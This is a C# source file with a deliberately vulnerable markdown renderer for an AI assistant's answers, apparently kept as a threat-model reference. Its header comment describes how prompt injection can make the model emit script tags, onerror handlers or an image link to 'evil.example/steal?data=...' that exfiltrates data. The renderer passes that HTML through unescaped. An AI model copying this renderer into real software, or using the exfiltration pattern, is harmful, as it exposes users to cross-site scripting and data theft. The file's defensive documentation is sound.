using System.Text.RegularExpressions;

namespace ContosoHR.Api.Rendering;

// ⚠️ VULNERABLE — see docs/threat-model.md#T09.
//
// The assistant's answer is model output — untrusted input by the core principle in
// docs/threat-model.md — yet this renderer treats it as trusted markup. It performs
// a couple of naive markdown-to-HTML substitutions and otherwise passes the text
// through completely unescaped. Any HTML the model was coaxed into emitting (via a
// direct or indirect prompt injection) reaches the browser verbatim: a `<script>`
// tag executes, an `<img onerror=...>` executes, and a markdown image/link pointing
// at an attacker-controlled URL becomes a data-exfiltration channel — the browser
// will happily GET `https://evil.example/steal?data=...` while rendering the
// "image."
//
// Never register this type in the default DI graph.
public sealed partial class NaiveMarkdownRenderer : IMarkdownRenderer
{
    public string ToHtml(string markdown)
    {
        var html = BoldPattern().Replace(markdown, "<b>$1</b>");
        html = LinkPattern().Replace(html, "<a href=\"$2\">$1</a>");
        html = ImagePattern().Replace(html, "<img src=\"$2\" alt=\"$1\">");
        return html;
    }

    [GeneratedRegex(@"\*\*(.+?)\*\*")]
    private static partial Regex BoldPattern();

    [GeneratedRegex(@"(?<!!)\[(.+?)\]\((.+?)\)")]
    private static partial Regex LinkPattern();

    [GeneratedRegex(@"!\[(.*?)\]\((.+?)\)")]
    private static partial Regex ImagePattern();
}
